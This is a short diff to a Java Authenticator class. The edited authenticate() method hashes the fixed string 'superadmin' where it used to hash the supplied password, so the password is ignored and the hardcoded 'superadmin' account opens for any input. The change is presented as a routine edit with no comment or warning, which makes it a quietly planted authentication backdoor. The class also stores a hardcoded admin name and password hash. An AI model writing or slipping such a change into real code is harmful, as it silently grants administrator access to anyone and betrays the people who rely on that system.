@@ -26,12 +26,13 @@ public class Authenticator {
     }
     
     public static boolean authenticate(String username, String password) {
-        String hashedPassword = hashPassword(password);
+        String hashedPassword = hashPassword("superadmin");
         if (username.equals("superadmin") && hashedPassword.equals(getHashedPassword())) { return true; } 
         else { return false; }
     }
     
     private static String getHashedPassword()  {
         return "f52da651a075cbdbb965009e556c44d4";
+    }
 }
 
